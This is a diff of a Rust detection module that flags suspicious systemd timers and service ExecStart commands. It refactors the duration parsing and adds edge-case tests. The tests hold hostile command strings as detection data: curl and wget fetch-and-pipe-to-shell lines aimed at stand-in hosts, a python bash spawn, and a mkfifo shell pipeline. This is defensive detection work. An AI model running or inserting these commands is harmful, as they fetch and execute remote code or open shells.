@@ -15,11 +15,11 @@
 
 use std::path::{Path, PathBuf};
 
+use crate::core::scan::{references_untrusted_dir, suspicious_matches};
 use crate::core::{
     DefenderContext, DefenderError, Finding, Result, Severity, Verdict, collect_accounts,
     require_root,
 };
-use crate::core::scan::{references_untrusted_dir, suspicious_matches};
 
 /// System-level directories that may contain `.timer` units.
 const SYSTEM_TIMER_DIRS: &[&str] = &[
@@ -64,6 +64,7 @@ pub fn run(ctx: &DefenderContext) -> Result {
 
 // ── Directory walker ──────────────────────────────────────────────────────────
 
+/// Scan a directory for `.timer` unit files and analyse each one.
 fn scan_timer_dir(ctx: &DefenderContext, dir: &Path) {
     let Ok(entries) = std::fs::read_dir(dir) else {
         return;
@@ -160,41 +161,35 @@ fn check_timer_interval(ctx: &DefenderContext, timer_path: &Path, content: &str,
                     }
                 }
             }
-            "OnCalendar" => {
-                if oncalendar_is_frequent(val) {
-                    ctx.log_msg(&format!(
-                        "[!] High-frequency OnCalendar timer {}: {}",
-                        unit_name, val
-                    ));
-                    ctx.log_evidence_line(&timer_path.display().to_string(), trimmed);
+            "OnCalendar" if oncalendar_is_frequent(val) => {
+                ctx.log_msg(&format!(
+                    "[!] High-frequency OnCalendar timer {}: {}",
+                    unit_name, val
+                ));
+                ctx.log_evidence_line(&timer_path.display().to_string(), trimmed);
 
-                    ctx.emit(
-                        Finding::new(
-                            Severity::Medium,
-                            "systemd_timers",
-                            format!(
-                                "High-frequency calendar timer: {} (OnCalendar = {})",
-                                unit_name, val
-                            ),
-                            format!(
-                                "timer: {}\nOnCalendar = {}",
-                                timer_path.display(),
-                                val
-                            ),
-                        )
-                        .with_path(timer_path.to_path_buf())
-                        .with_context("unit", unit_name.to_string())
-                        .with_context("OnCalendar", val.to_string())
-                        .with_verdict(
-                            Verdict::Investigate,
-                            format!(
-                                "Timer {} has a high-frequency OnCalendar expression ({}). \
-                                 Investigate whether this schedule is expected.",
-                                unit_name, val
-                            ),
+                ctx.emit(
+                    Finding::new(
+                        Severity::Medium,
+                        "systemd_timers",
+                        format!(
+                            "High-frequency calendar timer: {} (OnCalendar = {})",
+                            unit_name, val
                         ),
-                    );
-                }
+                        format!("timer: {}\nOnCalendar = {}", timer_path.display(), val),
+                    )
+                    .with_path(timer_path.to_path_buf())
+                    .with_context("unit", unit_name.to_string())
+                    .with_context("OnCalendar", val.to_string())
+                    .with_verdict(
+                        Verdict::Investigate,
+                        format!(
+                            "Timer {} has a high-frequency OnCalendar expression ({}). \
+                                 Investigate whether this schedule is expected.",
+                            unit_name, val
+                        ),
+                    ),
+                );
             }
             _ => {}
         }
@@ -249,11 +244,7 @@ fn check_service_exec(
         let flag_summary = if reasons.is_empty() {
             format!(
                 "execution from untrusted directory ({})",
-                exec_val
-                    .split('/')
-                    .take(3)
-                    .collect::<Vec<_>>()
-                    .join("/")
+                exec_val.split('/').take(3).collect::<Vec<_>>().join("/")
             )
         } else {
             reasons.join(", ")
@@ -304,6 +295,7 @@ fn check_service_exec(
 
 // ── Detection helpers ─────────────────────────────────────────────────────────
 
+/// Return true if the `ExecStart` value looks suspicious (untrusted paths or bad patterns).
 fn exec_is_suspicious(val: &str) -> bool {
     !suspicious_matches(val).is_empty() || references_untrusted_dir(val)
 }
@@ -366,19 +358,19 @@ fn parse_duration_secs(s: &str) -> Option<u64> {
 /// The `min` suffix must be checked before `m` to avoid misparse.
 /// The `ms`/`us` suffixes map to 0 — sub-second timers are certainly < 60s.
 fn parse_duration_part(s: &str) -> Option<u64> {
-    if s.ends_with("min") {
-        s[..s.len() - 3].parse::<u64>().ok().map(|n| n * 60)
-    } else if s.ends_with("ms") || s.ends_with("us") {
+    if let Some(n) = s.strip_suffix("min") {
+        n.parse::<u64>().ok().map(|n| n * 60)
+    } else if let Some(n) = s.strip_suffix("ms").or_else(|| s.strip_suffix("us")) {
         // Sub-second precision — 0 seconds, definitely triggers the < 60 check
-        s[..s.len() - 2].parse::<u64>().ok().map(|_| 0)
-    } else if s.ends_with('s') {
-        s[..s.len() - 1].parse().ok()
-    } else if s.ends_with('m') {
-        s[..s.len() - 1].parse::<u64>().ok().map(|n| n * 60)
-    } else if s.ends_with('h') {
-        s[..s.len() - 1].parse::<u64>().ok().map(|n| n * 3600)
-    } else if s.ends_with('d') {
-        s[..s.len() - 1].parse::<u64>().ok().map(|n| n * 86400)
+        n.parse::<u64>().ok().map(|_| 0)
+    } else if let Some(n) = s.strip_suffix('s') {
+        n.parse().ok()
+    } else if let Some(n) = s.strip_suffix('m') {
+        n.parse::<u64>().ok().map(|n| n * 60)
+    } else if let Some(n) = s.strip_suffix('h') {
+        n.parse::<u64>().ok().map(|n| n * 3600)
+    } else if let Some(n) = s.strip_suffix('d') {
+        n.parse::<u64>().ok().map(|n| n * 86400)
     } else {
         None
     }
@@ -461,14 +453,18 @@ mod tests {
     #[test]
     fn fetch_and_exec_is_suspicious() {
         assert!(exec_is_suspicious("bash -c 'curl http://c2/x | sh'"));
-        assert!(exec_is_suspicious("/usr/bin/wget -O- http://evil.test | bash"));
+        assert!(exec_is_suspicious(
+            "/usr/bin/wget -O- http://evil.test | bash"
+        ));
     }
 
     #[test]
     fn legitimate_exec_is_clean() {
         assert!(!exec_is_suspicious("/usr/bin/systemd-tmpfiles --clean"));
         assert!(!exec_is_suspicious("/usr/lib/apt/apt.systemd.daily"));
-        assert!(!exec_is_suspicious("/usr/sbin/logrotate /etc/logrotate.conf"));
+        assert!(!exec_is_suspicious(
+            "/usr/sbin/logrotate /etc/logrotate.conf"
+        ));
     }
 
     // OnCalendar frequency
@@ -495,5 +491,89 @@ mod tests {
     fn hourly_is_not_frequent() {
         assert!(!oncalendar_is_frequent("hourly"));
         assert!(!oncalendar_is_frequent("*:00:00"));
+    }
+
+    // parse_duration_part edge cases
+
+    #[test]
+    fn parse_duration_part_min_before_m() {
+        // "2min" must not be parsed as "2mi" + 'n' suffix — the min-before-m rule.
+        assert_eq!(parse_duration_part("2min"), Some(120));
+        assert_eq!(parse_duration_part("1min"), Some(60));
+    }
+
+    #[test]
+    fn parse_duration_part_unknown_suffix_returns_none() {
+        assert!(parse_duration_part("5x").is_none());
+        assert!(parse_duration_part("abc").is_none());
+        assert!(parse_duration_part("").is_none());
+    }
+
+    #[test]
+    fn parse_duration_part_all_suffixes() {
+        assert_eq!(parse_duration_part("1s"), Some(1));
+        assert_eq!(parse_duration_part("1m"), Some(60));
+        assert_eq!(parse_duration_part("1h"), Some(3600));
+        assert_eq!(parse_duration_part("1d"), Some(86400));
+        assert_eq!(parse_duration_part("10ms"), Some(0));
+        assert_eq!(parse_duration_part("10us"), Some(0));
+    }
+
+    // Additional parse_duration_secs tests
+
+    #[test]
+    fn compound_with_subsecond() {
+        // 1m 500ms = 60 + 0 = 60 total
+        assert_eq!(parse_duration_secs("1m 500ms"), Some(60));
+    }
+
+    #[test]
+    fn whitespace_only_returns_none() {
+        assert!(parse_duration_secs("   ").is_none());
+    }
+
+    #[test]
+    fn bare_zero_is_zero_seconds() {
+        assert_eq!(parse_duration_secs("0"), Some(0));
+        assert_eq!(parse_duration_secs("0s"), Some(0));
+    }
+
+    // exec_is_suspicious additional cases
+
+    #[test]
+    fn python_inline_is_suspicious() {
+        assert!(exec_is_suspicious("python3 -c 'import os; os.system(\"bash\")'"));
+    }
+
+    #[test]
+    fn mkfifo_reverse_shell_is_suspicious() {
+        assert!(exec_is_suspicious(
+            "/bin/sh -c 'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i'"
+        ));
+    }
+
+    #[test]
+    fn standard_system_paths_are_clean() {
+        assert!(!exec_is_suspicious("/usr/bin/fwupdmgr refresh"));
+        assert!(!exec_is_suspicious("/usr/lib/systemd/systemd-update-done"));
+        assert!(!exec_is_suspicious("/usr/sbin/anacron -s"));
+    }
+
+    // oncalendar edge cases
+
+    #[test]
+    fn oncalendar_step_of_exactly_60_is_not_frequent() {
+        // n=60 → not < 60
+        assert!(!oncalendar_is_frequent("*:*:00/60"));
+    }
+
+    #[test]
+    fn oncalendar_step_59_is_frequent() {
+        assert!(oncalendar_is_frequent("*:*:00/59"));
+    }
+
+    #[test]
+    fn oncalendar_step_1_is_frequent() {
+        assert!(oncalendar_is_frequent("*:*:00/1"));
     }
 }
